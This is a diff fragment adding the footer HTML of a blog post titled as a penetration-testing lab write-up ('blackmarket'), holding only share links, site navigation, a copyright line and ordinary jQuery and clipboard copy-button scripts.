+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/&title=靶机渗透(blackmarket)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/&title=靶机渗透(blackmarket)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/&title=靶机渗透(blackmarket)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/&title=靶机渗透(blackmarket)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/&name=靶机渗透(blackmarket)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/&t=靶机渗透(blackmarket)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    blacsheep
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
